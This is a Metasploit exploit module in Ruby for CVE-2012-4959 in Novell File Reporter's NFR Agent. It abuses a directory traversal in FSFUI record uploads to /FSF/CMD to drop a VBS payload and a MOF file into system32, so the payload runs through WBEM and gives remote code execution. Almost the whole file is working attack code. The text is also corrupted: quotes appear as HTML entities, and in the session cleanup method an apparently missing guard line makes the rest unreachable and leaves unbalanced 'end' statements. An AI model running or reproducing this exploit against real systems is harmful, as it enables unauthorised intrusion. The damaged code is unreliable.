# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;NFR Agent FSFUI Record File Upload RCE&#039;,
      &#039;Description&#039;    => %q{
        NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to upload
        arbitrary files via a directory traversal while handling requests to /FSF/CMD with
        FSFUI records with UICMD 130. This module has been tested successfully against NFR
        Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;juan vazquez&#039;
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;CVE-2012-4959&#039;],
          [ &#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 2048,
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 20
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          #Windows before Vista
          [ &#039;Automatic&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 16 2012&#039;))

    register_options(
      [
        Opt::RPORT(3037),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;Traversal depth&#039;, 6])
      ], self.class)

  end

  def on_new_session(client)

    return if not @var_mof_name
    return if not @var_vbs_name

      print_error("The following files must be removed manually:")
      print_error("The VBS payload: %WINDIR%\\system32\\#{@var_vbs_name}.vbs")
      print_error("The MOF file (%WINDIR%\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof)")
      return # That&#039;s it
    end

    # stdapi must be loaded before we can use fs.file
    client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

    begin
      print_good("Deleting the VBS payload \"#{@var_vbs_name}.vbs\" ...")
      windir = client.fs.file.expand_path("%WINDIR%")
      client.fs.file.rm("#{windir}\\system32\\" + @var_vbs_name + ".vbs")
      print_good("Deleting the MOF file \"#{@var_mof_name}.mof\" ...")
      cmd = "#{windir}\\system32\\attrib.exe -r " +
        "#{windir}\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"
      client.sys.process.execute(cmd, nil, {&#039;Hidden&#039; => true })
      client.fs.file.rm("#{windir}\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
    rescue ::Exception => e
      print_error("Exception: #{e.inspect}")
    end

  end

  def peer
    "#{rhost}:#{rport}"
  end

  def exploit

    # In order to save binary data to the file system the payload is written to a .vbs
    # file and execute it from there.
    @var_mof_name = rand_text_alpha(rand(5)+5)
    @var_vbs_name = rand_text_alpha(rand(5)+5)

    print_status("Encoding payload into VBS...")
    payload = generate_payload_exe
    vbs_content = Msf::Util::EXE.to_exe_vbs(payload)

    print_status("Generating VBS file...")
    mof_content = generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs")

    print_status("#{peer} - Uploading the VBS file")
    worked = upload_file("WINDOWS\\system32\\#{@var_vbs_name}.vbs", vbs_content)
    unless worked
      fail_with(Failure::NotVulnerable, "Failed to upload the file")
    end

    print_status("#{peer} - Uploading the MOF file")
    upload_file("WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof", mof_content)
  end

  def upload_file(filename, content)
    traversal = "..\\" * datastore[&#039;DEPTH&#039;]
    traversal << filename

    record = "<RECORD><NAME>FSFUI</NAME><UICMD>130</UICMD><FILE>#{traversal}</FILE><![CDATA[#{content}]]></RECORD>"
    md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
    message = md5 + record

    res = send_request_cgi(
      {
        &#039;uri&#039;     => &#039;/FSF/CMD&#039;,
        &#039;version&#039; => &#039;1.1&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;ctype&#039;   => "text/xml",
        &#039;data&#039;    => message,
      })

    if res and res.code == 200 and res.body.include? "<RESULT><VERSION>1</VERSION><STATUS>0</STATUS></RESULT>"
      print_warning("#{peer} - File successfully uploaded: #{filename}")
    else
      print_error("#{peer} - Failed to upload the file")
      return false
    end

    true
  end

end

